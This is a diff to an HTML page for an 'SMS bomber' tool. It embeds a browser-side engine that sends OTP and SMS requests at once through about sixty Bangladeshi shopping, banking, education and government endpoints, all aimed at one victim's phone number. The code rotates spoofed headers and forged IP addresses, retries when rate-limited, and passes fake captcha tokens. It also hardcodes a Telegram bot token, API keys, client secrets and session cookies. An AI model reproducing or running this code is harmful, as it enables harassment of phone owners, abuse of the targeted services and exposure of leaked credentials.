@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
-<title>SMS BOMBER TOOLS — TEAM DANGEROUS</title>
+<title>SMS BOMBING TOOLS</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><text y='28' font-size='28'>⚡</text></svg>">
 <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
 <meta name="theme-color" content="#020602">
@@ -241,9 +241,9 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
 
 <!-- BOOT -->
 <div id="boot">
-  <div class="boot-logo flk">TEAM DANGEROUS</div>
+  <div class="boot-logo flk">SMS BOMBER TOOLS</div>
   <div class="boot-bar-wrap"><div class="boot-bar"></div></div>
-  <div class="boot-txt">INITIALIZING EXPLOIT ENGINE v4.0...</div>
+  <div class="boot-txt">INITIALIZING SECURE SYSTEM...</div>
 </div>
 
 <!-- CURSOR -->
@@ -485,9 +485,150 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
 // ══════════════════════════════════════════════════
 //  CONFIG — Vercel hosted API
 // ══════════════════════════════════════════════════
-const API_URL   = 'api/send.js';
+// ── Telegram config ──
 const BOT_TOKEN = '8702637394:AAFgw5YHw5bR1nIBoNBa9gYkX0fdVHRdmz0';
 const CHAT_ID   = '5274336938';
+
+// ════════════════════════════════════════════════════════
+//  EMBEDDED BOMBING ENGINE  (send.js → browser-native)
+//  কোনো hosting লাগবে না — সরাসরি browser থেকে call
+//  সবচেয়ে fast: Promise.all() → সব API একসাথে fire
+// ════════════════════════════════════════════════════════
+const _BL=['01890183516','01893336440','01516511889','01905040150'];
+const _UA=['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36','okhttp/4.12.0','okhttp/4.11.0','okhttp/4.9.3','okhttp/3.14.9','Dart/3.2 (dart:io)','Dart/2.19 (dart:io)','Dart/2.14 (dart:io)','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230805.001)','Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016)'];
+const _AL=['en-US,en;q=0.9','en-GB,en;q=0.9','en-US,en;q=0.9,bn;q=0.8','bn-BD,bn;q=0.9,en;q=0.8'];
+const _IP=['59.152.4.182','103.48.196.14','202.134.8.11','118.179.211.54','103.231.184.32','43.245.8.192','116.193.180.7','119.40.82.116','182.160.110.48','103.15.250.19','103.75.246.8','27.147.173.22','103.69.126.91','180.148.28.6','36.255.68.14','103.111.204.55','103.56.207.12','103.4.93.188','45.115.104.30','103.7.28.14','202.78.172.4','202.78.172.100','59.152.4.50','203.76.48.10'];
+const _RF=['https://www.google.com/','https://www.google.com.bd/','https://www.facebook.com/','https://m.facebook.com/','https://www.bing.com/','',''];
+const _DV=['45098c95a7fe4109cc5969a770ee846a','48b1f7061f48c950090220f62128b2c3','5f545c10-e594-11f0-8299-fdfde03856d4','a1b2c3d4e5f67890','b5f0985eb84c4bfa'];
+const _FB='e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI';
+function _pr(s){let x=BigInt(s)^0x9e3779b97f4a7c15n;x=((x^(x>>30n))*0xbf58476d1ce4e5b9n)&0xFFFFFFFFFFFFFFFFn;x=((x^(x>>27n))*0x94d049bb133111ebn)&0xFFFFFFFFFFFFFFFFn;return Number((x^(x>>31n))&0xFFFFFFFFn);}
+function _pk(a,s){return a[Math.abs(_pr(s))%a.length];}
+function _ue(v){return encodeURIComponent(v===null||v===undefined?'':typeof v==='object'?JSON.stringify(v):String(v)).replace(/%20/g,'+');}
+function _fb2(p){return Object.entries(p).map(([k,v])=>k+'='+_ue(v)).join('&');}
+const _sl=ms=>new Promise(r=>setTimeout(r,ms));
+async function _fo(name,url,body,hdrs,isPost,seed,tms){
+  const c=new AbortController(),t=setTimeout(()=>c.abort(),tms);
+  const h={};let hU=0,hC=0,hA=0,hL=0,hX=0,hR=0;
+  for(const[k,v] of Object.entries(hdrs)){const l=k.toLowerCase();if(l==='user-agent')hU=1;if(l==='content-type')hC=1;if(l==='accept')hA=1;if(l==='accept-language')hL=1;if(l==='x-forwarded-for')hX=1;if(l==='referer')hR=1;h[k]=v;}
+  if(!hU)h['User-Agent']=_pk(_UA,seed);
+  if(!hC)h['Content-Type']='application/json';
+  if(!hA)h['Accept']='application/json, text/plain, */*';
+  if(!hL)h['Accept-Language']=_pk(_AL,seed+2);
+  if(!hX)h['X-Forwarded-For']=_pk(_IP,seed+3);
+  h['X-Real-IP']=_pk(_IP,seed+7);h['Cache-Control']='no-cache';h['Pragma']='no-cache';
+  if(!hR){const rf=_pk(_RF,seed+4);if(rf)h['Referer']=rf;}
+  const opt={method:isPost?'POST':'GET',headers:h,signal:c.signal};
+  if(isPost&&body)opt.body=body;
+  try{const r=await fetch(url,opt);clearTimeout(t);const s=r.status,ok=[200,201,202,204].includes(s),tx=await r.text().catch(()=>'');return{api:name,status:s,ok,body:tx.slice(0,150)};}
+  catch(e){clearTimeout(t);return{api:name,status:0,ok:false,err:e.name==='AbortError'?'timeout':String(e.message)};}
+}
+async function _fc(name,url,payload,hdrs,isPost,timeout){
+  const ct=Object.entries(hdrs).find(([k])=>k.toLowerCase()==='content-type')?.[1]||'application/json';
+  const bs2=ct.includes('x-www-form-urlencoded')?_fb2(payload):JSON.stringify(payload);
+  let base=0x517cc1b727220a95;for(let i=0;i<name.length;i++)base=(base+name.charCodeAt(i)*(i+1))>>>0;
+  for(let a=0;a<3;a++){
+    const r=await _fo(name,url,bs2,hdrs,isPost,_pr(base+a),timeout);
+    const{ok,status:s}=r;
+    if(ok)return r;
+    if([401,404,405,410,451].includes(s))return r;
+    if(s===403&&a<2){await _sl(500);continue;}
+    if(s===429){await _sl(a===0?1500:3000);continue;}
+    if(s===400){const b=r.body||'';if(['otp','OTP','sent','success','SMS','mobile','code','verify'].some(w=>b.includes(w)))return{...r,ok:true,note:'400+OTP'};if(a<2){await _sl(400);continue;}return r;}
+    if([0,500,502,503,504].includes(s)&&a<2){await _sl(800);continue;}
+    if(a===2)return r;
+  }
+  return{api:name,status:0,ok:false,err:'all attempts failed'};
+}
+function _f(n,u,p,h){return _fc(n,u,p,h,true,14000);}
+function _isBlocked(num){return _BL.some(b=>{const n=num.replace(/^0/,''),bn=b.replace(/^0/,'');return num===b||n===bn||'880'+n===b||num==='880'+bn;});}
+function _isValidBD(num){const c=num.replace(/^\+?880/,'').replace(/^0/,'');return c.length===10&&c.startsWith('1');}
+
+async function runBombing(numberStr){
+  if(!_isValidBD(numberStr))return{status:'error',message:'Invalid BD number',success:0,failed:0,total:0,results:[]};
+  if(_isBlocked(numberStr))return{status:'blocked',message:'This number is protected.',success:0,failed:0,total:0,results:[]};
+  const num=numberStr,bn=num.replace(/^0/,''),bf='880'+bn,pb='+88'+num,pbf='+880'+bn,dv=_DV[0],fb=_FB;
+  const R=await Promise.all([
+    _f('Shadhin Music','https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq',{msisdn:bf,shortcode:16235,servicename:'Shadhin Music'},{'Content-Type':'application/json','Origin':'https://shadhinmusic.com','Referer':'https://shadhinmusic.com/'}),
+    _f('Chorki','https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en',{number:pb},{'Content-Type':'application/json; charset=utf-8','Origin':'https://www.chorki.com','Referer':'https://www.chorki.com/','Accept':'application/json','x-requested-with':'XMLHttpRequest'}),
+    _f('Chorki Android','https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=android&language=en',{number:pbf},{'Content-Type':'application/json; charset=utf-8','Origin':'https://www.chorki.com','Referer':'https://www.chorki.com/','Accept':'application/json'}),
+    _f('Bioscope Live','https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en',{number:pbf},{'Content-Type':'application/json; charset=utf-8','Origin':'https://www.bioscopeplus.com','Referer':'https://www.bioscopeplus.com/','Accept':'application/json','authorization':'','x-requested-with':'mark.via.gp'}),
+    _f('Pickaboo','https://www.pickaboo.com/rest/default/V1/customer-check/exist',{mobile:num},{'Content-Type':'application/json; charset=utf-8','Origin':'https://www.pickaboo.com','Referer':'https://www.pickaboo.com/','Accept':'application/json, text/plain, */*','x-requested-with':'mark.via.gp'}),
+    _f('Shwapno','https://www.shwapno.com/api/auth',{phoneNumber:num},{'Content-Type':'application/json; charset=utf-8','Origin':'https://www.shwapno.com','Referer':'https://www.shwapno.com/','x-requested-with':'XMLHttpRequest'}),
+    _fc('Rokomari','https://www.rokomari.com/otp/send?emailOrPhone='+bf+'&countryCode=BD',{},{'Content-Type':'application/json; charset=utf-8','Origin':'https://www.rokomari.com','Referer':'https://www.rokomari.com/login','x-requested-with':'XMLHttpRequest'},true,14000),
+    _f('Sindabad','https://m2ce.sindabad.com/rest/V1/EasyLogin/isMobileAvailable',{websiteId:1.0,customerMobile:num},{'Content-Type':'application/json; charset=utf-8','Origin':'https://www.sindabad.com','Referer':'https://www.sindabad.com/','x-requested-with':'XMLHttpRequest'}),
+    _f('Kirei BD','https://frontendapi.kireibd.com/api/v2/send-login-otp',{email:num},{'Content-Type':'application/json; charset=utf-8','Origin':'https://kireibd.com','Referer':'https://kireibd.com/','Accept':'application/json, text/plain, */*','x-requested-with':'XMLHttpRequest'}),
+    _f('Easy BD','https://core.easy.com.bd/api/v1/registration',{password:'123456',password_confirmation:'123456',device_key:dv,name:'Team Dangerous',mobile:num,social_login_id:'',email:'dangerousboytushar@gmail.com'},{'Content-Type':'application/json; charset=utf-8','Host':'core.easy.com.bd','lang':'en','device-key':dv,'Origin':'https://easy.com.bd','Referer':'https://easy.com.bd/','Accept':'application/json, text/plain, */*','x-requested-with':'mark.via.gp'}),
+    _f('Easy BD Reg','https://core.easy.com.bd/api/v1/registration',{password:'Tushar@2021',password_confirmation:'Tushar@2021',device_key:'45098c95a7fe4109cc5969a770ee846a',name:'Rahat Ahmed',mobile:num,social_login_id:'',email:'rahat@example.com'},{'Content-Type':'application/json; charset=utf-8','Host':'core.easy.com.bd','lang':'en','device-key':'45098c95a7fe4109cc5969a770ee846a','Origin':'https://easy.com.bd','Referer':'https://easy.com.bd/','x-requested-with':'mark.via.gp'}),
+    _f('Le Reve Craze','https://www.lerevecraze.com/login/verify_phone',{mobile_no:num,resend:'0',recaptcha_token:'bypass'},{'Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.lerevecraze.com','Referer':'https://www.lerevecraze.com/login/','Accept':'application/json, text/javascript, */*; q=0.01','x-requested-with':'XMLHttpRequest'}),
+    _f('Focallure BD','https://store.focallurebd.com/api/v1/1/ecom/auth/getCode',{mobile:num},{'Content-Type':'application/json','user-agent':'Dart/2.14 (dart:io)','Origin':'https://store.focallurebd.com'}),
+    _f('Bata BD','https://www.batabd.com/apps/ez/api/GenerateOtp',{MobileNo:bn,EmailId:'team@dangerous.com',StoreName:'batabd.myshopify.com',IP:'59.152.4.182',Token:'bypass_token',CountryCode:'880'},{'Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.batabd.com','Referer':'https://www.batabd.com/account/register','Accept':'application/json, text/javascript, */*; q=0.01','x-requested-with':'XMLHttpRequest'}),
+    _f('Khaodao','https://api.eat-z.com/auth/customer/app-connect',{username:pb},{'host':'api.eat-z.com','x-eatz-apiclient':'ANDROID','accept':'application/json','content-type':'application/json; charset=UTF-8'}),
+    _f('Quality Foods','https://admin.qualityfoods.com.bd/api/auth/check-phone',{phone:num,is_sign_in:0,login_type:'phone'},{'Content-Type':'application/json','Origin':'https://qualityfoods.com.bd'}),
+    _f('Upay','https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/',{wallet_number:num,geo_location:{lat:23.8979093,long:89.1356346},referral:'',firebase_token:fb,device_uuid:dv,mno:'Robi'},{'Content-Type':'application/json'}),
+    _f('Fundesh OTP','https://fundesh.com.bd/api/auth/generateOTP?service_key=',{msisdn:bn},{'Content-Type':'application/json; charset=utf-8','Origin':'https://fundesh.com.bd','Referer':'https://fundesh.com.bd/fundesh/profile','x-requested-with':'mark.via.gp','User-Agent':'Mozilla/5.0 (Linux; Android 14; TECNO CK7n Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/148.0.7778.120 Mobile Safari/537.36'}),
+    _f('Fundesh Resend','https://fundesh.com.bd/api/auth/resendOTP',{msisdn:num},{'Content-Type':'application/json; charset=utf-8','Origin':'https://fundesh.com.bd','Referer':'https://fundesh.com.bd/','x-requested-with':'XMLHttpRequest'}),
+    _f('Shikho OTP','https://api.shikho.com/public/activity/otp',{phone:num,intent:'ap-discount-request'},{'Content-Type':'application/json','Accept':'application/json','Build-Version':'(450) 4.5.0','Origin':'https://shikho.com','Referer':'https://shikho.com/'}),
+    _f('Shikho SMS','https://api.shikho.com/auth/v2/send/sms',{auth_type:'signup',phone:bf,vendor:'shikho',type:'student'},{'Content-Type':'application/json; charset=utf-8','Accept':'application/json, text/plain, */*','Origin':'https://shikho.com','Referer':'https://shikho.com/','x-requested-with':'mark.via.gp','User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'}),
+    _f('Bohubrihi','https://bb-api.bohubrihi.com/public/activity/otp',{phone:num,intent:'login'},{'Content-Type':'application/json; charset=utf-8','Origin':'https://bohubrihi.com','Referer':'https://bohubrihi.com/','x-requested-with':'XMLHttpRequest'}),
+    _f('Mojaru','https://new.mojaru.com/api/student/login',{mobile_or_email:num},{'Content-Type':'application/x-www-form-urlencoded'}),
+    _f('Ghoori Learning','https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web',{mobile_no:num},{'Content-Type':'application/json','Host':'api.ghoorilearning.com','Referer':'https://ghoorilearning.com/','Origin':'https://ghoorilearning.com'}),
+    _f('English Moja','https://api.englishmojabd.com/api/v1/auth/login',{phone:pb},{'Content-Type':'application/json','User-Agent':'Dart/3.2 (dart:io)','Origin':'https://englishmojabd.com'}),
+    _f('Practice Club','https://www.practiceclub.net/api/register',{contact_no:num},{'Content-Type':'application/json','User-Agent':'okhttp/4.9.0','Origin':'https://www.practiceclub.net'}),
+    _f('ACS Future School','https://auth.acsfutureschool.com/api/v1/otp/send',{phone:num},{'Content-Type':'application/json','Origin':'https://acsfutureschool.com'}),
+    _f('Training Gov BD','https://training.gov.bd/backoffice/api/user/sendOtp',{mobile:num},{'Content-Type':'application/json','Origin':'https://training.gov.bd'}),
+    _f('Quizgiri','https://developer.quizgiri.xyz/api/v2.0/send-otp',{country_code:'+88',phone:num},{'Content-Type':'application/json','x-api-key':'gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G','User-Agent':'Dart/2.12 (dart:io)','Origin':'https://quizgiri.xyz'}),
+    _f('Sundarban Courier','https://api-gateway.sundarbancourierltd.com/graphql',{operationName:'CreateAccessToken',variables:{accessTokenFilter:{userName:num}},query:'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n    message\n    statusCode\n    result {\n      phone\n      otpCounter\n      __typename\n    }\n    __typename\n  }\n}'},{'Content-Type':'application/json; charset=utf-8','Origin':'https://customer.sundarbancourierltd.com','Referer':'https://customer.sundarbancourierltd.com/','authorization':'','x-requested-with':'mark.via.gp','User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'}),
+    _f('Garibook','https://api.garibookadmin.com/api/v4/user/login',{recaptcha_token:'garibookcaptcha',mobile:pb,channel:'web'},{'Content-Type':'application/json; charset=utf-8','Origin':'https://garibook.com','Referer':'https://garibook.com/','Accept':'application/json','x-requested-with':'mark.via.gp'}),
+    _f('Apex4u','https://api.apex4u.com/api/auth/login',{phoneNumber:num},{'Content-Type':'application/json; charset=utf-8','Referer':'https://apex4u.com/','Origin':'https://apex4u.com','Accept':'application/json, text/plain, */*','x-requested-with':'mark.via.gp'}),
+    _f('Nexo Pet','https://host03pet.nexopet.com/api/v1.0/users/send-otp',{phone:num},{'Content-Type':'application/json','Origin':'https://www.nexopet.com'}),
+    _f('AWS POC','https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send',{phone:num},{'Content-Type':'application/json'}),
+    _f('Deepto Play','https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en',{number:pb},{'Content-Type':'application/json; charset=utf-8','Host':'api.deeptoplay.com','Origin':'https://www.deeptoplay.com','Referer':'https://www.deeptoplay.com/','Accept':'application/json','x-requested-with':'XMLHttpRequest','authorization':''}),
+    _f('Chaldal','https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey',{phoneNumber:pbf,retryAttempt:0},{'Content-Type':'application/json; charset=utf-8','Origin':'https://chaldal.com','Referer':'https://chaldal.com/','Accept':'application/json','x-egg-storeid':'1','x-egg-clientapp':'Omelette','x-egg-platform':'Browser','x-requested-with':'mark.via.gp','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'}),
+    _f('Khaas Food','https://www.khaasfood.com/api/auth/request-otp',{username:num},{'Content-Type':'application/json; charset=utf-8','Origin':'https://www.khaasfood.com','Referer':'https://www.khaasfood.com/','Accept':'application/json','x-requested-with':'mark.via.gp','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','cache-control':'no-cache','pragma':'no-cache'}),
+    _f('Walton Plaza','https://waltonplaza.com.bd/api/auth/otp/create',{auth:{countryCode:'880',deviceUuid:'5f545c10-e594-11f0-8299-fdfde03856d4',phone:bn,type:'LOGIN'},captchaToken:'no recapcha'},{'Content-Type':'application/json; charset=utf-8','Origin':'https://waltonplaza.com.bd','Referer':'https://waltonplaza.com.bd/','x-requested-with':'XMLHttpRequest','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'}),
+    _f('Munchies BD','https://api.munchies.com.bd/parse/functions/generateOtp',{phone:num},{'Content-Type':'application/json; charset=utf-8','X-Parse-Application-Id':'munchiesbd','X-Parse-REST-API-Key':'munchiesbd','X-Parse-Client-Version':'js2.12.0','X-Parse-Installation-Id':'f47ac10b-58cc-4372-a567-0e02b2c3d479','Origin':'https://munchies.com.bd','Referer':'https://munchies.com.bd/'}),
+    _f('Meena Bazar','https://meenabazardev.com/api/mobile/front/send/otp',{CellPhone:num,type:'login'},{'Content-Type':'application/json; charset=utf-8','Origin':'https://meenabazardev.com','Referer':'https://meenabazardev.com/','Accept':'application/json, text/plain, */*'}),
+    _f('Paymaster BD','https://ap.paymasterbd.net/login_registration/',{phone_number:num,fcm_key:'',device_id:'b5f0985eb84c4bfa',sms_hash_code:'s2//QkN6BpW'},{'Content-Type':'application/x-www-form-urlencoded','User-Agent':'okhttp/3.14.9','Accept':'application/json','Accept-Language':'en-US,en;q=0.9'}),
+    _f('QPay BD','https://identity01.qpaybd.com.bd/api/v1/verification/phone',{Id:num},{'Content-Type':'application/json','User-Agent':'Dart/3.2 (dart:io)','Accept':'application/json','Accept-Language':'en-US,en;q=0.9'}),
+    _f('Dutch Bangla NX','https://nxpay1.dutchbanglabank.com/user/register',{aspId:'5678',locale:'EN',msisdn:bf,registrationUserId:bf,tcidList:[50],telcoId:'GP'},{'Content-Type':'application/json','X-KM-User-AspId':'5678','X-KM-Accept-language':'en','X-KM-OS-SERVICE-TYPE':'GMS','X-KM-User-Agent':'ANDROID/100046615','Host':'nxpay1.dutchbanglabank.com','User-Agent':'okhttp/4.9.3'}),
+    _f('FSIB Freedom','https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber',{AccessToken:'',TrackingNo:'',mobileNo:num,otpSms:'',product_id:'131',requestChannel:'MOB',trackingStatus:5},{'Content-Type':'application/json','User-Agent':'okhttp/4.10.0','Accept':'application/json','Accept-Language':'en-US,en;q=0.9'}),
+    _f('Ghoori Learning Login','https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&intent=login',{mobile_no:num,intent:'login'},{'Content-Type':'application/json','Host':'api.ghoorilearning.com','Referer':'https://ghoorilearning.com/','Origin':'https://ghoorilearning.com'}),
+    _f('iEducation BD','https://www.ieducationbd.com/api/account/check_user',{mobile:num},{'Content-Type':'application/json','Origin':'https://www.ieducationbd.com','Referer':'https://www.ieducationbd.com/','Accept':'application/json, text/plain, */*','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'}),
+    _f('RedX OTP','https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',{phoneNumber:num},{'Content-Type':'application/json','Origin':'https://redx.com.bd','Referer':'https://redx.com.bd/','app-agent':'merchant-web/1.0','Accept':'application/json, text/plain, */*','x-requested-with':'mark.via.gp'}),
+    _f('RedX Login','https://api.redx.com.bd/v1/user/request-login-code',{callingCode:'+880',phoneNumber:bn,countryCode:'BD',service:'redx'},{'Content-Type':'application/json; charset=utf-8','Origin':'https://redx.com.bd','Referer':'https://redx.com.bd/','Accept':'application/json, text/plain, */*','x-requested-with':'mark.via.gp','app-agent':'rider-web/1.0'}),
+    _f('Porter BD','https://customerapp-gateway-ktor.prod.porter.ae/onboarding/customer/signup',{phone:num},{'content-type':'application/json','country':'bd','preferred-languages':'{"app_language":"en"}','brand':'porter','source':'android','version-name':'6.7.0','custom-app-version-code':'410','client-request-uuid':'88c7743e-d714-4735-ad05-339e43cf8e73','installation-id':'0eb9e8bc-9725-4bd5-a382-fe92c716b3c7','app-session-id':'4699341c-6f94-4481-af99-041b43d24623','user-agent':'Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230805.001)','accept':'application/json','accept-language':'en-US,en;q=0.9'}),
+    _f('Gorilla Move','https://api.gorillamove.com/api/v1/core/account/phone_login',{phone_number:num,step:1},{'Content-Type':'application/json','Origin':'https://www.gorillamove.com','Referer':'https://www.gorillamove.com/','Accept':'application/json, text/plain, */*','User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'}),
+    _f('Otithee','https://gateway.otithee.com/api/v1/generate-otp',{request_type:'registration',mobile_number:num},{'Content-Type':'application/json','Accept':'application/json, text/plain, */*','Origin':'https://otithee.com','User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'}),
+    _f('Relaxy BD','https://dev.api.relaxy.com.bd/api/v1/otp/send',{phoneNumber:pbf,appSignature:'appSignature'},{'Content-Type':'application/json','User-Agent':'Dart/2.19 (dart:io)','x-api-key':'6yjOGvakSbHjA64NGqo7m25TBC4WX8BauAXEP3dX','Accept':'application/json'}),
+    _f('BD Matrimony','https://www.bangladeshimatrimony.com/register/editmobileno.php',{mobileNo:num},{'Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.bangladeshimatrimony.com','Referer':'https://www.bangladeshimatrimony.com/','Accept':'application/json, text/javascript, */*; q=0.01','x-requested-with':'XMLHttpRequest'}),
+    _f('MyGuardian BD','https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp',{mobileNumber:num,type:null},{'Content-Type':'application/json','Accept':'application/json, text/plain, */*','Origin':'https://myguardianbd.com','User-Agent':'okhttp/4.9.3'}),
+    _f('NRB Bazaar','https://www.nrbbazaar.com/Customer/RequestOtpForRegistration',{phoneNumber:num,email:'example@gmail.com','__RequestVerificationToken':'CfDJ8OTdK55f1KtKpMVto1XODz36P2tWXfyeot9aYuxWqkd81qABD_JFUva73ce2L5ftYmqCgwInZKUHisKU3mWb6DkYgBFDg4QIej8YwHP3BQ3fQvgBfc6mbMjVua7p-AT4MEPtgYhLexJmTxl7enCosqA'},{'Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.nrbbazaar.com','Referer':'https://www.nrbbazaar.com/','Accept':'application/json, text/javascript, */*; q=0.01','x-requested-with':'XMLHttpRequest','Cookie':'.Nop.Antiforgery=CfDJ8N5UM1Mg0_JFs4qu7TCIBSzGu689vm8mbvSPQ743hQSg8CQN0NF_XzfjEsi78OgkEPagdV_jE0-Bv17i3ToM1axTnWqbYcicXyGSwLVIJt-Jpak2l8yoNfuDZsgWG4Hlg4xPW4OOpCtcsf5xmMkdvFk'}),
+    _f('Medico Bio','https://api.v2.medico.bio/patient/passwordless-login',{phoneNumber:num,deviceId:dv,channel:'web',userType:'patient',type:'newUser'},{'Content-Type':'application/json','Origin':'https://medico.bio','Referer':'https://medico.bio/','Accept':'application/json, text/plain, */*'}),
+    _f('Amiprobashi','https://www.amiprobashi.com/api/v7/en/auth/send-otp',{device_type:'1',username:pb,for:'1',type:'1',bd_number:'1'},{'content-type':'application/x-www-form-urlencoded','android-app-version':'4.5.0','user-agent':'okhttp/4.10.0','Accept':'application/json'}),
+    _f('Bepari App','https://api.bepari.app/bestfreshfarm/api/V1.4/access-control/user/registerOtp',{client_id:4,client_secret:'zCzOixaOJ4JywQr1VsowGZhCaEbZ49WLxweNBgPK',mobile_no:num},{'Content-Type':'application/json','Origin':'https://www.bestfreshfarm.com','Referer':'https://www.bestfreshfarm.com/','Accept':'application/json, text/plain, */*'}),
+    _f('Hishabee','https://distribution.hishabee.business/api/app/v1/auth/number-check',{mobile_number:num},{'Content-Type':'application/json','Accept':'application/json, text/plain, */*','User-Agent':'okhttp/4.9.3'}),
+    _f('ILYN Global','https://api.ilyn.global/auth/signup',{phone:{code:'BD',number:num},provider:'sms'},{'Content-Type':'application/json','Accept':'application/json, text/plain, */*','Origin':'https://ilyn.global','User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'}),
+    _f('Klassy BD','https://api.klassy.com.bd/api/v2/public/user/register/send/otp',{phone:num},{'Content-Type':'application/json','Accept':'application/json, text/plain, */*','Origin':'https://klassy.com.bd','User-Agent':'okhttp/4.9.3'}),
+    _f('One Fish','https://api.onefish.app/api/auth/user/sendotp',{phone:num},{'Content-Type':'application/json','Accept':'application/json, text/plain, */*','User-Agent':'Dart/3.2 (dart:io)'}),
+    _f('Rangs Motors','https://api.rangsmotors.com/',{u_num:num},{'Content-Type':'application/json','Origin':'https://www.garimela.com','Referer':'https://www.garimela.com/','Accept':'application/json, text/plain, */*','User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'}),
+    _f('Walton Amar Awaz','https://walton-amar-awaz-prod.com/api/user/signup',{email:'',fbId:'',fullName:'User',gId:'',phone:num},{'Content-Type':'application/json','accept':'application/json','version-code':'1.4.7','authorization':'Bearer null','user-agent':'okhttp/4.7.2','Accept-Language':'en-US,en;q=0.9'}),
+    _f('PBS BD','https://pbs.com.bd/login/?handler=UserGetOtp',{UserName:'Teamdangerous',UserPassword:'Tushar',MobileNo:num},{'Content-Type':'application/json','XSRF-Token':'CfDJ8C8FhGbSUB1CplCwhmaw48FrjIGNq5sPRk0G6VzBicZtPJrEXDCoqGMiBTb3Fetxypt-480avEXqJS_WJVdEWQeDCz0mKIQO4odODIqIopHM8qh50R7CF3bOGHOtF22Pt-pgeyMhHQTk2t2inqJMRyw','Cookie':'.AspNetCore.Antiforgery.B6RPubf2LMI=CfDJ8C8FhGbSUB1CplCwhmaw48HSKnE-hppep13XT5NAyk3laCHJb_oP0B1wPBZQP-hzP8Z2CAclzIeEqkFAMeWJS8xWzyiIMY_sMlsO7WzVcxmONd9WUDnzazvUlK9zFOY8h6Pwx1xsDD9fgtr2ltr9qHE;','Origin':'https://pbs.com.bd','Referer':'https://pbs.com.bd/login/','Accept':'application/json, text/javascript, */*; q=0.01','x-requested-with':'XMLHttpRequest'}),
